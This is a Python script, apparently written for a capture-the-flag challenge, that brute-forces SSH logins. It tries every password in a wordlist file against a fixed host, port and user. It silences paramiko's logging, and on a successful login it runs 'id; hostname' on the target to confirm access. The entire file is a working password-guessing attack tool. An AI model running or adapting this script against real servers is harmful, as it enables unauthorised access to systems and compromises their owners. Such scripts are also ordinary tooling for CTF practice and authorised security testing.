import paramiko, sys, socket
HOST="0.cloud.chals.io"; PORT=25140; USER="vboxuser"
paramiko.util.log_to_file("/dev/null")
pws=[l.rstrip("\n") for l in open("pw.txt") if l.strip()]
for pw in pws:
    c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(HOST, port=PORT, username=USER, password=pw, timeout=8, allow_agent=False, look_for_keys=False, banner_timeout=8, auth_timeout=8)
        print("SUCCESS:", repr(pw))
        stdin,stdout,stderr=c.exec_command("id; hostname")
        print(stdout.read().decode()); print(stderr.read().decode())
        c.close(); sys.exit(0)
    except paramiko.AuthenticationException:
        print("fail:", pw); c.close()
    except Exception as e:
        print("err", pw, type(e).__name__, str(e)[:80]); c.close()
print("no success")
